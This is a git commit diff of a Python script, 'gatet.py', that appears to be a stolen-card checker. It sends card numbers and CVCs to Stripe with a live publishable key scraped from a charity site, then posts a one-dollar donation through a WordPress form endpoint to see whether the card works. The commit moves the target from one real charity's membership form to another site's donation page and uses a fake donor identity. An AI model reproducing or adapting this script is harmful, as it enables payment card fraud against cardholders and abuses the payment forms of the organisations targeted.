2ce2db05279a5700ca9f3c7dbfc074e635b8ef9d
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-01-21 15:48:21 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,33 +26,32 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+card-element&referrer=https%3A%2F%2Fwww.perkimselangor.org.my&time_on_page=80185&key=pk_live_51NaIqWBhOqJU3wd91DqqBdGzy7pF3vtmFibtdrrSATWKLDb6S5ddTC3DxngHMNTFThzg6y9QX9dklyDe7xOlaYbJ00UBarNVFl'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+card-element&referrer=https%3A%2F%2Fspreadjoy.cc&time_on_page=151096&key=pk_live_51GOSCsBBWTdpGUaJ2pAvEbhAFOQWHRykOuKaFrHN3k4cmNWnYxh8iFdwh0OmdDpvTGdqZPXHQ9jccDLxd9OS2TKx00ScOtAKZi'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'pys_session_limit': 'true',
-	    'pys_first_visit': 'true',
-	    'pysTrafficSource': 'google.com',
-	    'pys_landing_page': 'https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/',
-	    'last_pysTrafficSource': 'google.com',
-	    'last_pys_landing_page': 'https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/',
-	    '_fbp': 'fb.1.1737378914996.9470751466',
-	    '__stripe_mid': 'de9e881e-9c0f-495f-935e-cc8c1049008602f879',
-	    '__stripe_sid': '6ea0c9b5-425c-49e3-9b90-eabe35ebdffc663107',
-	    'pys_start_session': 'true',
+	    '__stripe_mid': '7eb6cc4c-3a92-420a-90f4-64ec79c3d6720e0d2c',
+	    '__stripe_sid': 'c4c60e8c-ca79-4930-b230-3fbc20f5c6a6c2100a',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_first_add': 'fd%3D2025-01-21%2008%3A29%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+	    'sbjs_current_add': 'fd%3D2025-01-21%2008%3A29%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fdonate%2F',
 	}
 	
 	headers = {
-	    'authority': 'www.perkimselangor.org.my',
+	    'authority': 'spreadjoy.cc',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'pys_session_limit=true; pys_first_visit=true; pysTrafficSource=google.com; pys_landing_page=https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/; last_pysTrafficSource=google.com; last_pys_landing_page=https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/; _fbp=fb.1.1737378914996.9470751466; __stripe_mid=de9e881e-9c0f-495f-935e-cc8c1049008602f879; __stripe_sid=6ea0c9b5-425c-49e3-9b90-eabe35ebdffc663107; pys_start_session=true',
-	    'origin': 'https://www.perkimselangor.org.my',
-	    'referer': 'https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/',
+	    # 'cookie': '__stripe_mid=7eb6cc4c-3a92-420a-90f4-64ec79c3d6720e0d2c; __stripe_sid=c4c60e8c-ca79-4930-b230-3fbc20f5c6a6c2100a; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-01-21%2008%3A29%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_current_add=fd%3D2025-01-21%2008%3A29%3A17%7C%7C%7Cep%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fspreadjoy.cc%2Fdonate%2F',
+	    'origin': 'https://spreadjoy.cc',
+	    'referer': 'https://spreadjoy.cc/donate/',
 	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -64,21 +63,15 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1737379290090',
+	    't': '1737448317785',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=1132&_fluentform_1_fluentformnonce=12f38c5687&_wp_http_referer=%2Fpendaftaran-ahli-perkim%2F&names%5Bfirst_name%5D=Rodam%20User&email=rodamuser08%40gmail.com&phone_1=%2B12084359362&numeric-field_1=071740&dropdown_1=Lelaki&input_text=US&dropdown_2=Lain-Lain&dropdown_3=Lain-Lain&dropdown_4=1.%20AMPANG&address2%5Baddress_line_1%5D=Street%2027&address2%5Bcity%5D=New%20York&address2%5Bstate%5D=New%20York&address2%5Bzip%5D=10080&payment_input_3=0&payment_method=stripe&image-upload%5B%5D=https%3A%2F%2Fwww.perkimselangor.org.my%2Fwp-content%2Fuploads%2Ffluentform%2Ftemp%2F8UksRRloI5Tln8JxnwqZl2mGIFGfhO%2Bbo8j2DdSkF3h9LQ8nQ2VOoPifiBu4umb0MOQsSg287irqE2sCOQT3koC2ew1ZFnutnYhBEsU2Tu9qCbQotsNS%2FOhbmkKMTlbELZf0s%2BaGmLKnfg1tkNHdNg%3D%3D&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=86&_fluentform_3_fluentformnonce=3fcc686729&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&dropdown=One%20Time&custom-payment-amount=1&payment_method=stripe&hidden=0&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '1',
+	    'form_id': '3',
 	}
 	
-	r2 = requests.post(
-	    'https://www.perkimselangor.org.my/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://spreadjoy.cc/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
